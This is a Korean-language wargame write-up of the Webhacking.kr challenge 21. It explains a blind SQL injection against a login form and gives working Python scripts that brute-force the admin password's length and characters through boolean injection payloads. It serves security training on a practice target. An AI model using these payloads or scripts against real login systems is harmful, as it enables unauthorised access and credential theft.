---
title: "Webhacking.kr challenge(old) 21th Write-Up"
tags: [wargame, blindsqli]
categories: [Web]
---

Webhacking.kr 21 Write-Up
-------------------------

## **문제 분석**

문제에 접속하면 id와 pw가 입력 가능한 창이 있고 대문짝만하게 BLIND SQL Injection이라고 적혀 있습니다. 먼저 Blind SQL Injection을 성공하기 위해서는 조건에 따른 페이지의 차이를 알 필요가 있었습니다. 페이지를 보면 result 부분이 있었는데 로그인 성공 여부에 따라 문구가 출력되는 것을 확인할 수 있었습니다.

![webhacking_kr_21_main](https://github.com/Jun-Project-LAB/Jun-Project-LAB.github.io/blob/main/_image/webhacking_kr_21_main.png?raw=true)

가장 먼저 로그인을 성공했을 때의 경우를 알고 싶었기에 guest/guest 계정을 사용하여 시도한 결과 login success라는 문구가 출력되었습니다. 이에 따라 guest 계정이 존재하는 것을 알 수 있었기에 참과 거짓을 구분할 방법을 알아내기 위해 아래 두 가지 Query를 시도하였습니다.

- 참일 경우 : ' or 1=1-- -
	- 반환 결과 : wrong password

- 거짓일 경우 : ' or 1=0-- -
	- 반환 결과 : login fail

즉, Query의 결과가 참일 경우 wrong password 라는 문구가 표시되는 것을 통해 SQL Injection의 성공 여부를 판단할 수 있었습니다. 이러한 유형의 문제는 admin의 password가 flag가 되거나 admin 계정으로 로그인에 성공하는 것이 목적이기에 이를 알아내기 위해 아래와 같은 코드를 작성하였습니다.

## **문제 해결**

먼저 admin 계정의 pw 길이를 알아내기 위해 다음과 같이 Python code를 작성하였습니다.

```python
for i in range(51):
    params["pw"] = "'or id='admin' and length(pw)={}-- ".format(i)
    response = req.get(url, cookies=cookies, params=params)
    if ref1 in response.text:
        length = i
        break

print("admin password length is {}".format(length))
```

이때, or 뒤에 id='admin' 조건을 작성하지 않을 경우 guest 계정에 대한 pw 길이도 비교하였기에 위와 같이 code를 수정하였습니다.

* * *

다음으로는 위에서 알아낸 pw 길이를 바탕으로 brute force 공격을 통해 전체 pw를 알아낼 수 있는 code를 작성하였습니다.

```python
for i in range(length+2):
    for j in range(33, 127):
        params["pw"] = "' or id='admin' and ascii(substring(pw, {}, 1))={}-- ".format(i, j)
        response = req.get(url, cookies=cookies, params=params)
        if ref1 in response.text:
            pw += chr(j)
            break

print("admin password is : {}".format(pw))
```

처음 작성한 code의 경우 대소문자를 명확하게 구별할 수 없어서 pw를 구했음에도 문제를 해결할 수 없었습니다. 따라서 ascii 함수를 통해 추출한 값을 비교함으로써 이러한 문제를 해결하였습니다.

최종적으로 사용된 코드는 아래와 같습니다.

```python
#!/usr/bin/python

import requests as req

url = "https://webhacking.kr/challenge/bonus-1/index.php"
cookies = {"PHPSESSID":"22h1kbhc6uk1mhisjb9f5tif6n"}
params = {"id":"admin"}
ref1 = "wrong password"
length = ""
pw = ""

for i in range(51):
    params["pw"] = "'or id='admin' and length(pw)={}-- ".format(i)
    response = req.get(url, cookies=cookies, params=params)
    if ref1 in response.text:
        length = i
        break

print("admin password length is {}".format(length))

for i in range(length+2):
    for j in range(33, 127):
        params["pw"] = "' or id='admin' and ascii(substring(pw, {}, 1))={}-- ".format(i, j)
        response = req.get(url, cookies=cookies, params=params)
        if ref1 in response.text:
            pw += chr(j)
            print(pw)
            break

print("admin password is : {}".format(pw))
```
